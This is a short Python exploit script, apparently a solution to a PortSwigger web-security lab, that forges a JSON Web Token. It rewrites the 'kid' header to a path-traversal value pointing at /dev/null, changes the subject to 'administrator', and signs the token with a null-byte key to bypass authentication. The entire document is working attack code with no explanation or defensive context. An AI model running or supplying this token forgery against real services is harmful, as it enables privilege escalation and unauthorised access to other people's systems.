# JWT authentication bypass via kid header path traversa
import base64
import json
from jwcrypto import jwt, jwk

orig_jwt = "eyJraWQiOiI3NDczNDhmNS03NDY4LTRjY2EtODU2Yy1kMGUzMzM2N2IwZmEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2OTcwMDczNH0.WTrB6LxRYm04MOJDSwIKTDDwtun8dwSO9-NbZcs0gqg"
h, p, s = orig_jwt.split('.')

h_json = json.loads(
    base64.urlsafe_b64decode(h + '='*(len(h)//4)).decode()
)
p_json = json.loads(
    base64.urlsafe_b64decode(p + '='*(len(p)//4)).decode()
)

h_json["kid"] = "../../../../../../dev/null"
p_json["sub"] = "administrator"

key = jwk.JWK.generate(kty="oct", size=256)
# key.export()
key["k"] = "AA=="

Token = jwt.JWT(header=json.dumps(h_json),
                claims=json.dumps(p_json))
Token.make_signed_token(key)
print(Token.serialize())
